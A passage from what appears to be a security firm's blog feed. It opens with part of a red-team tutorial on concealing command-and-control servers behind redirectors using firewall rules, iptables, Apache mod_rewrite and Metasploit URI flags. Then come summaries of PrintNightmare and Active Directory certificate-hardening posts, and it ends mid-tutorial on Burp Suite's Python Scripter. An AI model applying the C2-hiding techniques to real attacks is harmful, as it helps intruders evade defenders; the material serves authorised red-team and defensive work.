&lt;p&gt;Let’s configure Traffic from our &lt;strong&gt;redirector&lt;/strong&gt; IP &lt;strong&gt;outbound&lt;/strong&gt; and &lt;strong&gt;inbound&lt;/strong&gt; from TCP port &lt;strong&gt;8080&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;And then let’s finish up by &lt;strong&gt;disallowing outbound traffic&lt;/strong&gt; anywhere else&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-14.png&#34; alt=&#34;2021 07 16 11 14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;What we have here is a firewall configuration that allows C2 communication from our malicious core server to our malicious core redirector.  We then need to duplicate our efforts on the &lt;strong&gt;redirector server’s firewall.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-27.png&#34; alt=&#34;2021 07 16 11 27&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;When we’re all done, our tracks should be covered. We can confirm this using &lt;strong&gt;nmap&lt;/strong&gt;. When we scan our Core C2 IP address, it now displays as filtered, indicating that traffic is secured and is only accessible via the redirector server. &lt;strong&gt;Awesome for us&lt;/strong&gt;, not so much for the blue team!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-29.png&#34; alt=&#34;2021 07 16 11 29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.1.3 IPTables Redirection&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;313-iptables-redirection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#313-iptables-redirection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;IPtables&lt;/strong&gt; is a unix tool that allows granular control of network traffic, down to the packet level. It’s an incredibly powerful tool that can be leveraged for both defense and offense - let’s try the latter. &lt;/p&gt;
&lt;p&gt;It is possible to acheive &lt;strong&gt;same&lt;/strong&gt; &lt;strong&gt;result&lt;/strong&gt; as socat dumb pipe redirection but using &lt;strong&gt;IPTables&lt;/strong&gt; instead. Here, we specify exactly which network traffic &lt;strong&gt;packets&lt;/strong&gt; should accepted or dropped, and where they should be &lt;strong&gt;forwarded&lt;/strong&gt; or &lt;strong&gt;rerouted&lt;/strong&gt; in order to meet our tailored specification for masking the traffic to and from our core C2 server. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-30.png&#34; alt=&#34;2021 07 16 11 30&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The end result is similar to &lt;strong&gt;socat&lt;/strong&gt; and &lt;strong&gt;ufw&lt;/strong&gt;, and we manage to communicate from C2 server, to redirector, to compromised endpoint all without revealing the C2 server to the blue team! In the screenshot below, we’re actively running malicious commands to the compromised machine whilst leveraging the granular iptables rules to obfuscate our rerouted malicious network traffic. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-30_1.png&#34; alt=&#34;2021 07 16 11 30 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.2 Redirection using Apache mod_rewrite&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;32-redirection-using-apache-mod_rewrite&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#32-redirection-using-apache-mod_rewrite&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;An alternate method to dumb pipe redirection employs &lt;strong&gt;Apache mod_rewrite&lt;/strong&gt;, which offers a number of techniques to strengthen our infrastructure. &lt;/p&gt;
&lt;p&gt;Essentially, apache mod_rewrite allows a proxy to behave differently if fed different arbitrary information - such as user agent, operating system, IP address and more. This creates more varied network traffic, as the rules we give will dictate if traffic should be dropped, accepted, or redirected according to particular prescribed behaviour. There is significant time and effort consumption to using this method compared to socat and the firewalls, delivering improved results in return. &lt;/p&gt;
&lt;p&gt;We can accomplish this by specifying rulesets and a &lt;em&gt;.htaccess&lt;/em&gt; file in the webserver&amp;rsquo;s root directory. In our case, we&amp;rsquo;re going to create a rule that redirects curious visitors to our labs.jumpsec.com page. Let’s take a deep dive into setting this up. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-32-1024x616.png&#34; alt=&#34;2021 07 16 11 32&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.2.1 Configuring Apache Mod_Rewrite&lt;/strong&gt; &lt;span class=&#34;absolute -mt-20&#34; id=&#34;321-configuring-apache-mod_rewrite&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#321-configuring-apache-mod_rewrite&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To begin, we need Apache2 on our redirection server. We then need to open up its configurations file, and change &lt;em&gt;AllowOverride&lt;/em&gt; from &lt;strong&gt;None&lt;/strong&gt; to &lt;strong&gt;All&lt;/strong&gt; inside &lt;em&gt;/etc/apache2/apache.conf&lt;/em&gt; to begin the process of abusing mod_rewrite for our own malicious intent. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-33.png&#34; alt=&#34;2021 07 16 11 33&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We then can &lt;strong&gt;enable&lt;/strong&gt; Apache2 module rewrite, and follow up by restarting the apache web service so the change can take effect. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo a2enmod rewrite proxy proxy_http
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo service apache2 restart&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-34.png&#34; alt=&#34;2021 07 16 11 34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Then, within the web server&amp;rsquo;s root directory, we must create a &lt;strong&gt;.htaccess&lt;/strong&gt; file. This will filter traffic based on our specified criteria and is therefore a crucial component in this whole operation (so let’s not make any mistakes here!). Set  &lt;strong&gt;.htaccess&lt;/strong&gt; file&amp;rsquo;s &lt;em&gt;chmod&lt;/em&gt; permissions to &lt;strong&gt;644&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-37.png&#34; alt=&#34;2021 07 16 11 37&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.2.2 Malicious Rules&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;322-malicious-rules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#322-malicious-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now that we’ve installed the necessities, let’s get to work. We need to create our ruleset that will filter proxy traffic based on arbitrary behaviours / strings that we give to the web server. &lt;/p&gt;
&lt;p&gt;Let’s create a rule that behaves differently depending on if an incoming request has a particular &lt;strong&gt;directory.&lt;/strong&gt; Only we will know the secret directory that will facilitate malicious traffic. To everyone else, we will forward them to this awesome site we know…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-39.png&#34; alt=&#34;2021 07 16 11 39&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In the above ruleset, we can see that if the directory &lt;strong&gt;/jstest&lt;/strong&gt; is explicitly included in the http(s) traffic, it will be forwarded to our &lt;strong&gt;C2 core server&lt;/strong&gt; running on &lt;strong&gt;x.x.x.223.&lt;/strong&gt; If any traffic attempts to come that does not include that specific &lt;strong&gt;/jstest&lt;/strong&gt; directory, then the apache web server will behave differently and reroute the nosey, inquisitive investigator to &lt;strong&gt;&lt;em&gt;labs.jumpsec.com&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To the unwitting visitor to our redirector middle-man server, they are simply visiting the JUMPSEC labs website. They did include the secret &lt;strong&gt;/jstest&lt;/strong&gt; directory in their request, and therefore they will not discover the hidden malicious infrastructure we have set up.&lt;/p&gt;
&lt;p&gt;Conversely, by offering the &lt;strong&gt;/jstest&lt;/strong&gt; directory in a request, we are able to control and issue commands across our obfuscated communication line. In our example below, we could have had something incredibly sophisticated and malicious&amp;hellip;instead we chose to issue a warning.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-40.png&#34; alt=&#34;2021 07 16 11 40&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.2.3 Integrating mod_rewrite elsewhere&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;323-integrating-mod_rewrite-elsewhere&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#323-integrating-mod_rewrite-elsewhere&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;It’s awesome to use mod_rewrite to arbitrarily change the behaviour of our web server. However the default C2 usability of this method is unwieldy. In the example below, we can see it’s a bit clunky and doesn’t lend itself to the rapid action that a red team operator needs. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-41-1024x158.png&#34; alt=&#34;2021 07 16 11 41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It is possible to fit this apache mod_rewrite technique in as a component to other C2 infrastructure. Earlier, we spoke about &lt;strong&gt;Metasploit&lt;/strong&gt;, and whilst it isn’t the most reliable of it’s peers it is quite flexible and good at fitting new components in. We can make &lt;strong&gt;Metasploit&lt;/strong&gt; and &lt;strong&gt;apache mod_rewrite&lt;/strong&gt; play nicely with each other, which will make our ability to issue commands that much easier.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Metasploit&lt;/strong&gt;, we can leverage the &lt;em&gt;-URI uriflag&lt;/em&gt;. If we run a meterpreter payload on the compromised machine, we can ensure that only payloads with this URI flag can connect to our C2 Server, preventing anybody interested from peeking into our domains. This step doesn’t just ensure our C2 remains &lt;strong&gt;hidden&lt;/strong&gt; but also &lt;strong&gt;improves&lt;/strong&gt; the &lt;strong&gt;usability&lt;/strong&gt; of our redirections.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-42.png&#34; alt=&#34;2021 07 16 11 42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;4. Beyond C2&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;This article only covered one of the many elements of the offensive security arsenal. Robust and obfuscated C2 is one of the most critical actions that successful red teamers and real-world attacker’s alike take when compromising a network. I hope that this high-level article demonstrates that creating a covert infrastructure is a critical step in effective and covert attack simulation.&lt;/p&gt;
&lt;p&gt;There is much more to talk about overall about the red team’s attack path repertoire. And there is still more to talk about C2 itself! There are so many ways to customise a C2 infrastructure that some have even written and deployed &lt;a href=&#34;https://labs.f-secure.com/tools/c3/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;C3 infrastructure&lt;/a&gt; as part of their engagements. Adversaries in real life have used C3 to create kernel-level APIs that they then use to communicate, rather than utilising the protocols and services that C2 uses (like SSH or HTTPs). The limits are truly endless for command-and-control.&lt;/p&gt;
&lt;p&gt;Shd is a Red Team Operator @ JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>PRINTNIGHTMARE NETWORK ANALYSIS</title>
      <link>//localhost:1313/articles/2021/07/2021-07-07-printnightmare-network-analysis/</link>
      <pubDate>Wed, 07 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-07-printnightmare-network-analysis/</guid>
      <description>
        
        
        &lt;p&gt;By &lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dray Agha&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The infosec community has been busy dissecting the &lt;strong&gt;PrintNightmare exploit&lt;/strong&gt;. There are now &lt;strong&gt;variations of the exploit&lt;/strong&gt; that can have &lt;strong&gt;various impacts&lt;/strong&gt; on a target machine.&lt;/p&gt;
&lt;p&gt;When we at JUMPSEC saw that &lt;a href=&#34;https://github.com/LaresLLC/CVE-2021-1675/blob/main/zeek/PrintNightmare.pcap&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Lares&lt;/a&gt; had captured some network traffic of the PrintNightmare exploit in action, I wondered if there was an opportunity &lt;strong&gt;to gather network-level IoCs and processes&lt;/strong&gt; that could offer defenders &lt;strong&gt;unique but consistent methods of detection across the various exploits.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this blog, I leverage &lt;strong&gt;Tshark&lt;/strong&gt; and see if it can reveal anything about the &lt;strong&gt;networking side&lt;/strong&gt; of the &lt;strong&gt;PrintNightmare&lt;/strong&gt; exploit. Our goal is purely exploratory, investigating the general workings and network activity of this exploit under the hood. &lt;strong&gt;&lt;a href=&#34;https://labs.jumpsec.com/printnightmare-network-analysis/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read More&amp;hellip;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Written by: Dray Agha, Security Researcher&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Securing against new offensive techniques abusing active directory certificate service</title>
      <link>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</link>
      <pubDate>Tue, 06 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/</guid>
      <description>
        
        
        &lt;p&gt;SpecterOps recently released an offensive security research paper that details techniques enabling an adversary to abuse insecure functionality in Active Directory Certificate Service.&lt;/p&gt;
&lt;p&gt;SpecterOps reports that abusing the legitimate functionality of Active Directory Certificate Service will allow an adversary to forge the elements of a certificate to authenticate as any user or administrator in Active Directory. JUMPSEC has highlighted numerous changes that can be made to Active Directory Certificate Service configuration to protect the domain through a defence-in-depth approach.&lt;/p&gt;
&lt;p&gt;We at JUMPSEC wanted to understand the defensive application of this offensive research to pre-emptively defend our clients from these techniques before exploitation is observed in the wild. To do this, we utilised our Active Directory lab and attempted to harden the service to reduce the risk of compromise and limit the ability for an attacker to cause harm.&lt;/p&gt;
&lt;p&gt;In this article, JUMPSEC has documented the most effective and efficient methods we took to implement the broad defensive guidance in SpecterOps research. In our attempts to harden Active Directory Certificate Service, we have identified ways to harden the environment against compromise, and leverage auditing toolkits to make it easier to identify and remediate areas of exposure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://labs.jumpsec.com/active-directory-certificate-service-defensive-guidance/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read here for technical extracts&lt;/a&gt;&lt;/strong&gt; or for the full technical guide &lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;click here&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Article written by Dray Agha, Security Researcher |&lt;/strong&gt; Any questions, comments, or criticisms please drop me a line on: &lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;, or &lt;a href=&#34;mailto:dray.agha@jumpsec.com&#34; &gt;Email&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2021/07/Active-Directory-Certificate-Service-Defensive-Guidance-v1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/Defensive-Guidance-v1-1-pdf.jpg&#34; alt=&#34;Active Directory Certificate Service Defensive Guidance&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Overcoming Issues Using Custom Python Scripts with Burp Suite Professional</title>
      <link>//localhost:1313/articles/2021/04/2021-04-28-burp-suite-python-scripter/</link>
      <pubDate>Wed, 28 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/04/2021-04-28-burp-suite-python-scripter/</guid>
      <description>
        
        
        &lt;h3&gt;Summary / TL:DR&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary--tldr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary--tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;I recently encountered some issues when using Burp Suite Professional which led me to playing around with the Python Scripter extension. The extension allows running custom Python scripts on every request/response processed by Burp, including those generated by functionality such as Burp&amp;rsquo;s active scanner. This has a number of potential use cases, but I found it particularly useful to re-implement client-side functions that prevented the active scanner from identifying vulnerabilities it would normally detect. The extension is quite simple to use but has a somewhat steep learning curve, so I have shared some of my processes, findings and code samples which may be useful for others in similar situations.&lt;/p&gt;
&lt;h3&gt;Background&lt;span class=&#34;absolute -mt-20&#34; id=&#34;background&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#background&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When working on a recent client project I encountered an issue where the login functionality base64 encoded the username and password before sending it in a JSON request to the server. An example of this is shown below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;{
	&amp;#34;payload&amp;#34;:&amp;#34;eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicGFzc3dvcmQiOiJ0ZXN0cGFzcyJ9&amp;#34;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The base64 encoded string decodes to {&amp;ldquo;username&amp;rdquo;:&amp;ldquo;testuser&amp;rdquo;,&amp;ldquo;password&amp;rdquo;:&amp;ldquo;testpass&amp;rdquo;} which is another JSON body with the input username and password. Unfortunately, at the time this format caused a lot of issues with fuzzing tools such as Burp Suite Professional’s active scanner. When scanning the endpoint Burp wasn’t quite smart enough to handle the encoding and decoding and didn’t fuzz the inner parameters inside the base64 encode input. Knowing that the web server logic wouldn’t correctly decode the fuzzed input, I set out to find a way to scan the parameters before they are encoded and have Burp automatically encode the input before it’s sent to the server.&lt;/p&gt;
&lt;p&gt;I found a number of extensions which appeared to work with base64 encoded values. However, none of these worked when the request to the server was sent in a JSON format. Eventually, I came across the Python Scripter extension [&lt;a href=&#34;https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;1&lt;/a&gt;] which claimed to allow the execution of custom Python scripts on every request/response processed by Burp. As someone who enjoys writing Python scripts this sounded perfect for me and I decided to learn how to use it. Unfortunately, there was very little documentation about the extension and the user interface was simply an empty text box with no additional information.&lt;/p&gt;
&lt;p&gt;At this point I spent time googling and finding any existing code samples online to try and figure out how to actually use the extension. A particularly useful resource I found was lanmaster53’s pyscripter-er github repo [&lt;a href=&#34;https://github.com/lanmaster53/pyscripter-er&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;2&lt;/a&gt;] which is worth checking out if you want to learn more advanced usage. Eventually, I managed to get a good enough understanding to be able to make a python script that would take a normal request with a username and password parameter and format it as a base64 encoded string sent in a JSON request. Since carrying out the test and writing this blog post, Burp has been updated and the active scanner now performs fuzzing of base64 encoded input. However, I thought I’d still write this up to provide a resource for understanding how to actually use the Python Scripter extension as base64 encoding was just one example of where it could be useful.&lt;/p&gt;
&lt;h3&gt;Basic Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;basic-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#basic-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Along with installing the extension, I recommend installing the logger++ extension [&lt;a href=&#34;https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;3&lt;/a&gt;] as this is useful for viewing the request after it has been modified by the python script. Overall, the basic setup involves three areas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The extension script window – For writing the python code&lt;/li&gt;
&lt;li&gt;The extension output/error window – For debugging the python code&lt;/li&gt;
&lt;li&gt;Logger++ – Seeing the transformed request as it is sent to the server&lt;/li&gt;
&lt;/ul&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscript_1b.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Print statements or other python console output will be displayed here, with errors shown in the “Errors” tab.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h3&gt;Intercepting and Viewing Requests&lt;span class=&#34;absolute -mt-20&#34; id=&#34;intercepting-and-viewing-requests&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#intercepting-and-viewing-requests&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Perhaps the most difficult part when using the extension is figuring out how to actually intercept the requests sent so that you can begin modifying it. As mentioned previously, there isn’t much in the way of documentation, but as the extension makes use of the Burp Suite extender API [&lt;a href=&#34;https://portswigger.net/burp/extender/api/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;4&lt;/a&gt;] we can use the documentation for that to learn a bit more about how to interact with requests. We know the extension implements the following variables and after reviewing the extender API documentation we can get a rough estimate of what class or value they correspond to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;extender – IBurpExtender class&lt;/li&gt;
&lt;li&gt;callbacks – IBurpExtenderCallbacks class&lt;/li&gt;
&lt;li&gt;helpers – IExtensionHelpers class&lt;/li&gt;
&lt;li&gt;toolFlag – Integer value defining which Burp tool created the request&lt;/li&gt;
&lt;li&gt;messageIsRequest – Boolean value indicating whether the current message being processed is a request&lt;/li&gt;
&lt;li&gt;messageInfo – IHttpRequestResponse class&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After reviewing the documentation of these classes, we can make a simple script to print out core information about the request such as the HTTP request headers and the body of a POST request. This includes all the information we likely want to modify such as any request parameters.&lt;/p&gt;
&lt;p&gt;GET Request:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;if messageIsRequest:
	reqbytes = messageInfo.getRequest()
	req = helpers.bytesToString(reqbytes)
	print(req)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;POST Request:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;if messageIsRequest:
	reqbytes = messageInfo.getRequest()
	req = helpers.analyzeRequest(reqbytes)
	headers = req.getHeaders()
	parameters = reqbytes[(req.getBodyOffset()):].tostring()
	print(parameters)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_2a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_2b.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;With the script included the request headers are stored in the req variable and can be printed to the output window.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_3a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_3b.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Similarly, using a script we can access the POST request parameters.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h3&gt;Modifying a Request&lt;span class=&#34;absolute -mt-20&#34; id=&#34;modifying-a-request&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#modifying-a-request&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now that we can get core information about the request, we can write whatever Python code we want to start extracting specific information from the request and change it. This could be using regular expressions or simply functions such as split and strip to process the input and combine it with specific functions based on the context of the application, e.g. base64 encoding the input.&lt;/p&gt;
&lt;p&gt;After we have modified our input value the request will need to be recreated using the new modified input. For GET requests this process is simple, we simply need to convert the modified request back to byte format and then set the message as the new request. For POST requests we will need to build a new request that combines the previous HTTP headers with the modified body and then set this as the new request.&lt;/p&gt;
&lt;p&gt;GET Request:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;newreq_bytes = helpers.stringToBytes(modified_req)
